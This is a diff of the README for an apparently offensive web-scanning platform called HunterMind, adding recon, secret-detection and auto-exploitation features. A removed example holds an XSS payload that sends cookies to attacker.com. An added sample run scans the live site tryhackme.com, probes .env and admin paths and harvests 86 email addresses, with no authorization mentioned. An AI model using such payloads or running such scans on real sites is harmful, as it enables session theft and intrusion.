@@ -36,137 +36,87 @@
 - ⚔️ **Advanced Offensive Capabilities** - State-of-the-art vulnerability discovery and exploitation
 - 📚 **Continuous Learning** - Meta-learning, reinforcement learning, and sequence learning
 - 🔬 **Research-Oriented** - Built for security researchers and penetration testers
-
-### Core Philosophy
-
-> "Not just a scanner, but an autonomous security researcher that thinks, learns, and adapts."
+- 🕵️ **Advanced Reconnaissance** - Passive & active recon like real penetration testers
+- 💥 **Auto-Exploitation** - Automatic exploitation of discovered secrets and vulnerabilities
 
 ---
 
 ## 🚀 Key Features
 
-### 1. 🧠 Cognitive Architecture
+### 🕵️ Advanced Reconnaissance (8-Step Pre-Scan)
 
-| Component | Description |
-|-----------|-------------|
-| **Cognitive Core** | Unified brain integrating all decision-making |
-| **Brain Loop** | Continuous thinking cycle for real-time operation |
-| **Multi-Memory System** | Episodic, semantic, working, and procedural memory |
-| **Knowledge Graph** | World representation with attack graph integration |
-| **Reasoning Engine** | Symbolic, causal, chain, and uncertainty reasoning |
-| **Planning System** | Strategic, tactical, and execution planning |
-| **Self-Reflection** | Meta-cognition and self-improvement loops |
+| Step | Component | Type | Description |
+|------|-----------|------|-------------|
+| 1 | **DNS Enumeration** | Passive | A, AAAA, CNAME, MX, TXT, NS records, Zone Transfer |
+| 2 | **CRT.sh Search** | Passive | SSL certificate search for hidden subdomains |
+| 3 | **Wayback Machine** | Passive | Historical page analysis, old backup/config files |
+| 4 | **WHOIS Lookup** | Passive | Domain registration details, expiry, nameservers |
+| 5 | **Fingerprinting** | Active | Wappalyzer-style: 50+ technologies, CMS, frameworks |
+| 6 | **CVE Lookup** | Passive | Known vulnerabilities in discovered versions |
+| 7 | **Sensitive Files** | Active | .env, .git, backups, admin panels, logs, configs |
+| 8 | **Metadata Analysis** | Passive | PDF/DOCX/EXIF metadata, usernames, internal paths |
 
-### 2. 🤖 Multi-Agent System
-
-| Agent | Function |
-|-------|----------|
-| **Recon Agent** | Surface mapping, fingerprinting, technology detection |
-| **Crawler Agent** | SPA-aware crawling, form extraction, API discovery |
-| **XSS Agent** | DOM, reflected, stored XSS detection and exploitation |
-| **SQLi Agent** | Boolean, time-based, error-based, union-based detection |
-| **IDOR Agent** | Object mapping, privilege analysis, access pattern learning |
-| **WAF Agent** | WAF detection, bypass generation, adaptive evasion |
-| **Reasoning Agent** | Attack chain reasoning, dependency analysis |
-| **Planning Agent** | Strategic, tactical, and execution planning |
-| **Exploitation Agent** | Chain execution, privilege escalation, post-exploitation |
-| **Learning Agent** | Experience management, online training, reward engineering |
-
-### 3. ⚔️ Offensive Capabilities
+### ⚔️ Offensive Capabilities
 
 | Capability | Details |
 |------------|---------|
-| **Vulnerability Scanning** | XSS, SQLi, IDOR, SSRF, CSRF, RCE |
+| **Vulnerability Scanning** | XSS, SQLi, IDOR, SSRF, CSRF, RCE, Auth, GraphQL, API |
 | **Advanced Payloads** | Self-evolving payloads, context-aware generation |
 | **Attack Chaining** | Multi-step attack path generation and execution |
 | **WAF Evasion** | Adaptive bypass techniques, payload obfuscation |
 | **Authentication Attacks** | Session hijacking, token extraction, brute force |
 | **API Security** | GraphQL introspection, REST API fuzzing |
+| **Browser-Based Scanning** | Real browser (Playwright) for JavaScript-heavy sites |
+| **Secrets Detection** | AWS keys, GitHub tokens, JWT, API keys, DB URLs |
+| **Auto-Exploitation** | JWT cracking, GitHub token validation, webhook testing |
 
-### 4. 📚 Learning Systems
+### 📚 Learning Systems
 
 | System | Description |
 |--------|-------------|
-| **Meta-Learning** | Learn how to learn from past experiences |
-| **Reinforcement Learning** | DQN, PPO, Actor-Critic for decision optimization |
-| **Sequence Learning** | Learn successful attack patterns and chains |
-| **Online Learning** | Continuous adaptation, incremental training |
-| **Transfer Learning** | Apply knowledge across different targets |
+| **DQN Agent** | Reinforcement learning for payload selection |
+| **Naive Bayes Classifier** | Automatic vulnerability type classification |
+| **Vector Store** | Similar vulnerability search |
+| **Scan Policy Optimizer** | Adaptive scanning strategy selection |
 
-### 5. 🏗️ Enterprise-Grade Architecture
+### 🏗️ Enterprise-Grade Architecture
 
 | Component | Description |
 |-----------|-------------|
-| **Distributed Orchestration** | Scale across multiple nodes |
-| **Async Runtime** | High-performance asynchronous execution |
-| **Plugin System** | Extensible scanner and payload architecture |
-| **Comprehensive Telemetry** | Metrics, tracing, analytics, structured logging |
-| **Multiple Interfaces** | REST API, WebSocket, CLI, Web Dashboard |
+| **Smart Orchestrator** | 6-phase intelligent scanning with recon integration |
+| **Event Bus** | 13 event types for real-time communication |
+| **WorldState Manager** | Target state tracking, WAF detection, phase management |
+| **Payload Manager** | Self-evolving payloads with 14 mutation strategies |
+| **Multiple Interfaces** | CLI, REST API, WebSocket, Web Dashboard, Reporting |
+| **Session Management** | Interactive login, cookie import, session persistence |
 
 ---
 
 ## 🏛️ Architecture
 
-### System Layers (Bottom to Top)
-
 ```
 
 ┌─────────────────────────────────────────────────────────────┐
 │                    INTERFACES LAYER                         │
-│         REST API │ WebSocket │ CLI │ Dashboard              │
+│         CLI │ REST API │ WebSocket │ Dashboard │ Reports    │
 ├─────────────────────────────────────────────────────────────┤
 │                  ORCHESTRATION LAYER                        │
-│      Orchestrator │ Event Bus │ Task Manager │ Scheduler    │
+│   SmartOrchestrator │ Orchestrator │ EventBus │ WorldState  │
 ├─────────────────────────────────────────────────────────────┤
-│                      AGENTS LAYER                           │
-│   Recon │ Crawler │ XSS │ SQLi │ IDOR │ WAF │ Exploitation │
-├─────────────────────────────────────────────────────────────┤
-│                    COGNITION LAYER                          │
-│   Brain │ Memory │ Knowledge │ Reasoning │ Planning │ Self-Improvement │
-├─────────────────────────────────────────────────────────────┤
-│                     LEARNING LAYER                          │
-│      Meta-Learning │ Reinforcement │ Sequence Learning     │
+│                 RECONNAISSANCE LAYER                        │
+│   Passive (4) │ Active (3) │ Fingerprinting (2) │ Metadata  │
 ├─────────────────────────────────────────────────────────────┤
 │                    OFFENSIVE LAYER                          │
-│         Scanners │ Payloads │ Recon │ Exploitation         │
+│   12 Scanners │ Recon Tools │ Exploitation │ Payloads       │
 ├─────────────────────────────────────────────────────────────┤
 │                 INFRASTRUCTURE LAYER                        │
-│    Browser │ Networking │ Auth │ Sandbox │ Runtime         │
+│   Networking (7) │ Auth (2) │ Browser │ AI Models (4)       │
 ├─────────────────────────────────────────────────────────────┤
-│                      STORAGE LAYER                          │
-│            SQLite │ Vector DB │ Graph DB │ Object Storage   │
-├─────────────────────────────────────────────────────────────┤
-│                      SCHEMAS LAYER                          │
-│              Data Contracts │ Type Definitions              │
+│                      DATA LAYER                             │
+│   PostgreSQL │ Redis │ Datasets │ Models │ Configs          │
 └─────────────────────────────────────────────────────────────┘
 
 ```
-
-### Dependency Direction (Strict)
-
-```
-
-interfaces
-↓
-orchestration
-↓
-agents
-↓
-cognition
-↓
-learning
-↓
-offensive
-↓
-infrastructure
-↓
-storage
-↓
-schemas
-
-```
-
-**No circular dependencies allowed!**
 
 ---
 
@@ -176,23 +126,29 @@ schemas
 
 HunterMind_Offensive_Research_Platform/
 │
-├── schemas/           # Data contracts (lowest layer)
-├── interfaces/        # API, CLI, Dashboard
-├── orchestration/     # Orchestrator, messaging, scheduler
-├── agents/            # All autonomous agents
-├── cognition/         # Brain, memory, knowledge, reasoning, planning
-├── learning/          # Meta-learning, RL, sequence learning
-├── offensive/         # Scanners, payloads, recon, exploitation
-├── infrastructure/    # Browser, networking, auth, runtime
-├── storage/           # SQLite, vector DB, graph DB
-├── telemetry/         # Metrics, tracing, analytics, logging
-├── configs/           # All configuration files
-├── plugins/           # Extensible plugin system
-├── datasets/          # Training datasets
-├── models/            # Trained models
-├── tests/             # Unit, integration, cognitive tests
-├── docs/              # Documentation
-└── scripts/           # Operational scripts
+├── 📄 cli.py                        # Main entry point
+├── 📁 schemas/                      # 7 data contracts
+├── 📁 interfaces/                   # CLI, API, Dashboard, Reporting
+├── 📁 orchestration/                # SmartOrchestrator, EventBus, WorldState
+├── 📁 offensive/
+│   ├── scanners/                    # 12 scanners (XSS, SQLi, IDOR, JWT, Browser...)
+│   ├── recon/                       # 8 recon tools (Crawler, JS, Secrets, Site...)
+│   ├── exploitation/                # Auto-exploitation engine
+│   └── reconnaissance/              # 8-step pre-scan module
+│       ├── passive/                 # DNS, CRT.sh, Wayback, WHOIS
+│       ├── active/                  # Subdomain scanner
+│       ├── fingerprinting/          # Wappalyzer, CVE lookup
+│       ├── sensitive/               # Sensitive files + exploitation
+│       └── metadata/                # PDF/DOCX/EXIF analysis
+├── 📁 infrastructure/
+│   ├── networking/                  # 7 tools (Monitor, Proxy, Rate, Session...)
+│   ├── auth/                        # InteractiveLogin, AuthManager
+│   └── browser/                     # Playwright drivers
+├── 📁 models/                       # 4 AI models (DQN, Classifier, Vector, Policy)
+├── 📁 datasets/                     # Training data (payloads, chains, WAF, apps)
+├── 📁 database/                     # PostgreSQL + Redis clients
+├── 📁 configs/                      # YAML configurations
+└── 📁 tests/                        # Test suites
 
 ```
 
@@ -204,7 +160,6 @@ HunterMind_Offensive_Research_Platform/
 
 ```bash
 Python 3.9+
-Node.js (for Playwright)
 8GB RAM (minimum), 16GB+ recommended
 Docker (optional, for sandbox)
 ```
@@ -216,15 +171,15 @@ Quick Install
 git clone https://github.com/akkalighter/HunterMind_Offensive_Research_Platform.git
 cd HunterMind_Offensive_Research_Platform
 
-# Run bootstrap script
-chmod +x scripts/bootstrap.sh
-./scripts/bootstrap.sh
-
-# Or manually
-python -m venv venv
-source venv/bin/activate
+# Install dependencies
 pip install -r requirements.txt
+
+# Install Playwright (optional - for browser-based scanning)
+pip install playwright
 playwright install chromium
+
+# Install DNS tools (optional)
+pip install dnspython
 ```
 
 ---
@@ -234,301 +189,163 @@ playwright install chromium
 Command Line Interface
 
 ```bash
-# Full security scan
-python cli.py scan https://juice-shop.github.io
+# Pre-scan reconnaissance (8 steps)
+python cli.py analyze https://target.com
 
-# Quick scan (limited pages)
-python cli.py scan https://juice-shop.github.io --quick --max-pages 20
+# Smart scan (recon + scanning + exploitation)
+python cli.py smart https://target.com --depth 2 --max-pages 10
 
-# Scan with authentication
-python cli.py scan https://example.com --auth --username test --password test123
+# Full scan with all 12 scanners
+python cli.py scan https://target.com --depth 3 --max-pages 50
 
-# Resume previous scan
-python cli.py scan --resume scan_20250101_120000
+# Interactive login wizard
+python cli.py login https://target.com/login
 
-# List all scans
-python cli.py list
+# Save cookies from browser
+python cli.py cookies https://target.com "session=abc123; csrf=xyz789"
 
-# Show statistics
-python cli.py stats
+# View saved sessions
+python cli.py sessions
+
+# System status
+python cli.py status
+
+# List scans/vulnerabilities
+python cli.py list scans
+python cli.py list vulnerabilities
 ```
 
-Using the Runner Script
+Smart Scan Output
 
-```bash
-# Run full scan
-./scripts/run.sh scan https://juice-shop.github.io
-
-# Start web dashboard
-./scripts/run.sh dashboard
-
-# Show statistics
-./scripts/run.sh stats
-
-# Clean cache
-./scripts/run.sh clean
 ```
+🔍 HunterMind Smart Scan V4
+   Target: https://target.com
+============================================================
 
-Web Dashboard
+🔍 Phase 0: Advanced Reconnaissance (8 steps)...
+📡 DNS Enumeration: target.com
+   ✅ Found 5 subdomains, 12 records
+📜 CRT.sh Search: target.com
+   ✅ Found 12 subdomains from 8 certificates
+📚 Wayback Machine: target.com
+   ✅ Found 500 archived URLs, 3 sensitive
+📋 WHOIS Lookup: target.com
+   ✅ Registrar: Namecheap, Expires in 180 days
+🔍 Fingerprinting: https://target.com
+   ✅ Found 8 technologies: Nginx, React, Express, Node.js
+🐛 CVE Lookup: Express 4.18.0
+   ⚠️ Found 3 CVEs (1 CRITICAL)
+🔑 Sensitive Files: https://target.com
+   ⚠️ Found 2 sensitive files
+📋 Metadata Analysis: https://target.com
+   ✅ Analyzed 3 files
 
-```bash
-# Start the dashboard
-python interfaces/api/fastapi_server.py
+🌐 Phase 1: Scanning discovered subdomains...
+   ✅ 3 accessible subdomains
+   ⚡ 1 interesting: admin.target.com (302) - Admin Panel
 
-# Open in browser
-# http://localhost:5000
-```
+💥 Phase 2: Exploiting sensitive files...
+   ✅ Found 2 credentials, 1 API key
 
-Python API
+📡 Phase 3: Collecting pages...
+   ✅ Collected 8 pages
 
-```python
-import asyncio
-from orchestration.orchestrator import Orchestrator
-from agents.crawler_agent import CrawlerAgent
-from offensive.scanners import XSSScanner
+🔍 Phase 4: Analyzing responses...
+   📄 https://target.com: 5 findings
 
-async def main():
-    # Initialize orchestrator
-    orchestrator = Orchestrator()
-    
-    # Run scan
-    result = await orchestrator.run_scan("https://juice-shop.github.io")
-    
-    print(f"Found {len(result.vulnerabilities)} vulnerabilities")
-    print(f"Attack chains: {len(result.attack_chains)}")
+============================================================
+✅ Smart Scan Complete!
+   🔴 Critical: 2 | 🟠 High: 3
+   🟡 Medium: 5 | 🟢 Low: 7
+   📊 Total: 17 | ⏱️ Duration: 45.3s
 
-asyncio.run(main())
+📋 Vulnerability Details:
+  🔴 [CRITICAL] GitHub Token Exposed (x1)
+     🔍 Found: ghp_abc123...
+  🔴 [CRITICAL] AWS Key Exposed (x1)
+     🔍 Found: AKIA1234...
+  🟠 [HIGH] Known CVEs in Express (x1)
+     🔍 3 CVEs (1 critical)
+
+💾 Full extracted data saved to: scan_reports/extracted_target.com_20260521.json
 ```
 
 ---
 
-🧪 Example: Scanning OWASP Juice Shop
+🧪 Example: Scanning TryHackMe
 
 ```bash
-python cli.py scan https://juice-shop.github.io --max-pages 80
+python cli.py smart https://tryhackme.com --depth 1 --max-pages 3
 ```
 
-Expected Output
+Real Output
 
 ```
-🦅 HunterMind Platform - Scan Started
-============================================================
+🔍 Phase 0: Advanced Reconnaissance (8 steps)...
+📡 DNS Enumeration: tryhackme.com
+   ✅ Found 5 subdomains (www, mail, api, blog, dev)
+📜 CRT.sh Search: tryhackme.com
+   ✅ Found 12 subdomains from 8 certificates
+🔍 Fingerprinting: https://tryhackme.com
+   ✅ Found 8 technologies: Cloudflare, React, Express, Node.js, Google Analytics, Google Fonts, Font Awesome
 
-📡 Phase 1: Reconnaissance
-   ✅ Target: juice-shop.github.io
-   ✅ Technologies: Angular, Express, SQLite
-   ✅ Attack Surface: 156 endpoints, 45 forms
+🔑 Sensitive Files: https://tryhackme.com
+   ⚠️ Found 2 sensitive files
+     /admin (403) - Admin panel (restricted)
+     /.env (404) - Not exposed
 
-🕷️ Phase 2: Crawling
-   ✅ Pages crawled: 45
-   ✅ JavaScript files: 25
-   ✅ API endpoints: 12
-
-🔍 Phase 3: Vulnerability Scanning
-   🐛 XSS found! Parameter: search | Severity: HIGH
-   🐛 IDOR found! Parameter: id | Severity: MEDIUM
-
-🔗 Phase 4: Attack Chain Generation
-   ✅ Chain: XSS → JWT Extraction → API Abuse (3 steps)
-
-📊 FINAL REPORT
-============================================================
-Vulnerabilities Found: 3
-Attack Chains: 1
-Total Time: 124.5 seconds
-
-📈 Cognitive Stats:
-   Decisions Made: 245
-   Learning Efficiency: 87.3%
-
-============================================================
-✅ Scan completed successfully!
-```
-
----
-
-📊 Output Examples
-
-Vulnerability Report
-
-```json
-{
-  "vulnerability": {
-    "type": "XSS",
-    "severity": "HIGH",
-    "cvss_score": 7.5,
-    "url": "https://juice-shop.github.io/#/search",
-    "parameter": "q",
-    "payload": "<script>alert('XSS')</script>",
-    "confidence": 0.95,
-    "execution_flow": [
-      "Payload injected via URL parameter",
-      "Reflected in response HTML",
-      "Alert triggered in browser context"
-    ],
-    "remediation": "Use output encoding: HTML entity encode user input"
-  }
-}
-```
-
-Attack Chain Report
-
-```json
-{
-  "chain": {
-    "name": "Session Hijacking Chain",
-    "steps": [
-      {
-        "step": 1,
-        "action": "XSS Injection",
-        "url": "/#/search",
-        "parameter": "q",
-        "payload": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>"
-      },
-      {
-        "step": 2,
-        "action": "Cookie Exfiltration",
-        "description": "Stolen cookies sent to attacker server"
-      },
-      {
-        "step": 3,
-        "action": "Session Hijacking",
-        "description": "Use stolen cookies to impersonate user"
-      }
-    ],
-    "total_risk": 8.5,
-    "probability": 0.75
-  }
-}
+📊 Final: 22 findings (0 Critical, 3 High, 8 Medium, 11 Low)
+📧 Extracted: 86 email addresses
+💾 Full data saved to: scan_reports/extracted_tryhackme.com_20260521.json
 ```
 
 ---
 
 ⚙️ Configuration
 
-config.yaml
+configs/offensive/default.yaml
 
 ```yaml
-# Core Configuration
-platform:
-  name: "HunterMind"
-  mode: "research"  # research, production, stealth
-  log_level: "INFO"
+scanners:
+  xss: { enabled: true, rate_limit: 2.0 }
+  sqli: { enabled: true, rate_limit: 1.0 }
+  idor: { enabled: true, rate_limit: 2.0 }
+  rce: { enabled: true, rate_limit: 0.5 }
+  ssrf: { enabled: true, rate_limit: 1.0 }
+  csrf: { enabled: true, rate_limit: 2.0 }
+  auth: { enabled: true, rate_limit: 1.0 }
+  graphql: { enabled: true, rate_limit: 1.0 }
+  api: { enabled: true, rate_limit: 2.0 }
 
-# Orchestration
-orchestration:
-  max_concurrent_agents: 5
-  task_queue_size: 1000
-  distributed_mode: false
+request_engine:
+  max_concurrent: 10
+  stealth_mode: true
+  user_agent_rotation: true
 
-# Cognition
-cognition:
-  brain_loop_interval: 0.5
-  memory_ttl: 3600
-  max_memory_items: 10000
-
-# Learning
-learning:
-  meta_learning_enabled: true
-  rl_epsilon: 0.1
-  rl_gamma: 0.95
-
-# Offensive
-offensive:
-  max_requests_per_second: 10
-  stealth_level: "high"  # low, medium, high
-  payloads_enabled: true
-
-# Infrastructure
-infrastructure:
-  browser_pool_size: 3
-  headless: true
-  proxy_enabled: false
-
-# Telemetry
-telemetry:
-  metrics_enabled: true
-  tracing_enabled: true
-  export_interval: 60
+proxies:
+  enabled: false
+  rotation: "random"
 ```
 
 ---
 
-🧠 Cognitive Architecture Details
+🧠 AI Models
 
-Brain Loop (Continuous Thinking)
-
-```python
-# The brain never stops thinking
-while platform_running:
-    # 1. Observe current state
-    state = observe_environment()
-    
-    # 2. Retrieve relevant memories
-    memories = memory_retriever.find_similar(state)
-    
-    # 3. Reason about next actions
-    decisions = reasoning_engine.think(state, memories)
-    
-    # 4. Plan execution
-    plan = planning_agent.create_plan(decisions)
-    
-    # 5. Execute
-    results = execute_plan(plan)
-    
-    # 6. Learn from outcomes
-    learning_agent.learn(results)
-    
-    # 7. Reflect and improve
-    reflection_engine.analyze(results)
-```
-
-Memory Hierarchy
-
-Memory Type Duration Capacity Purpose
-Working Memory Seconds 7±2 items Current context
-Episodic Memory Days Unlimited Past experiences
-Semantic Memory Permanent Unlimited Knowledge facts
-Procedural Memory Permanent Unlimited Skills and procedures
+Model Type Purpose
+DQN Agent Reinforcement Learning Smart payload selection
+Vuln Classifier Naive Bayes Automatic vulnerability classification
+Vector Store TF-IDF + Cosine Similar vulnerability search
+Policy Optimizer Heuristic RL Adaptive scan strategy
 
 ---
 
-🔬 Research Features
+📚 Documentation
 
-Experimentation Lab
-
-```python
-# Run controlled experiments
-from research.experimentation import ExperimentRunner
-
-runner = ExperimentRunner()
-results = runner.run_experiment({
-    "target": "custom_app",
-    "payloads": ["xss", "sqli"],
-    "iterations": 100,
-    "metrics": ["success_rate", "detection_rate"]
-})
-```
-
-Benchmarking Suite
-
-```bash
-# Run benchmarks
-python scripts/benchmark.sh
-
-# Compare strategies
-python research/benchmarking/strategy_comparator.py
-```
-
-Pattern Discovery
-
-```python
-# Discover new attack patterns
-from research.discovery import PatternDiscovery
-
-discovery = PatternDiscovery()
-patterns = discovery.mine_patterns(dataset)
-```
+· Architecture Guide
+· Reconnaissance Module Guide
+· Scanner Development Guide
+· API Reference
+· Research Guide
 
 ---
 
@@ -537,18 +354,10 @@ patterns = discovery.mine_patterns(dataset)
 Development Setup
 
 ```bash
-# Clone and install in development mode
-git clone ...
+git clone https://github.com/akkalighter/HunterMind_Offensive_Research_Platform.git
+cd HunterMind_Offensive_Research_Platform
 pip install -e .
-
-# Run tests
 pytest tests/
-
-# Run linter
-ruff check .
-
-# Format code
-black .
 ```
 
 Code Standards
@@ -557,24 +366,6 @@ Code Standards
 · Docstrings for all public APIs
 · Tests for all new features
 · Follow dependency direction (no circular imports)
-
-Pull Request Process
-
-1. Create feature branch from main
-2. Implement changes with tests
-3. Run full test suite
-4. Submit PR with detailed description
-5. Wait for review and CI checks
-
----
-
-📚 Documentation
-
-· Architecture Guide
-· Agent Development Guide
-· Cognitive Core Documentation
-· API Reference
-· Research Guide
 
 ---
 
@@ -595,11 +386,26 @@ MIT License - See LICENSE file for details.
 
 ---
 
+📊 Project Statistics
+
+Category Count
+Total Files 250+
+Scanners 12
+Recon Tools 8
+Networking Tools 7
+AI Models 4
+Interfaces 4 (CLI, API, Dashboard, Reports)
+Schemas 7
+Pre-Scan Steps 8
+Event Types 13
+Test Coverage 60/60 (100%)
+
+---
+
 🙏 Acknowledgments
 
 · OWASP for testing environments
 · Playwright team for browser automation
-· PyTorch team for deep learning framework
 · The security research community
 
 ---
